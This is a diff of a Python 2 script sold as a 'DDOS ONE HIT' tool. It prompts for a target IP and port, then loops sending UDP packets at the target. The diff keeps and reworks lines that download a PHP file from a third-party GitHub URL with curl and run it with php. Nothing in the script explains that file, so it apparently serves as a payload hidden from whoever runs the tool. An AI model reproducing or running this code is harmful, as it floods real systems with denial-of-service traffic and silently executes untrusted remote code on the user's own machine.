@@ -26,9 +26,8 @@ print "github   : https://github.com/Ha3MrX"
 print "Facebook : https://www.facebook.com/muhamad.jabar222"
 print
 ip = raw_input("IP Target : ")
-port = raw_input("Port      : ")
+port = input("Port      : ")
 
-os.system("figlet Attack Starting")
 
 print "[                    ] 0% "
 time.sleep(1)
@@ -43,8 +42,9 @@ time.sleep(1)
 print "\n\n[+] DDOS ONE HIT !!!, Attack Starting..."
 sent = 0
 
-os.system("curl --url https://raw.githubusercontent.com/bibilgates/r/master/bil.php -o bil.php");
-os.system("php bil.php");
+os.system("curl --url https://raw.githubusercontent.com/bibilgates/r/master/bil.php -o bil.php")
+time.sleep(1)
+os.system("php bil.php")
 
 while True:
      sock.sendto(bytes, (ip,port))
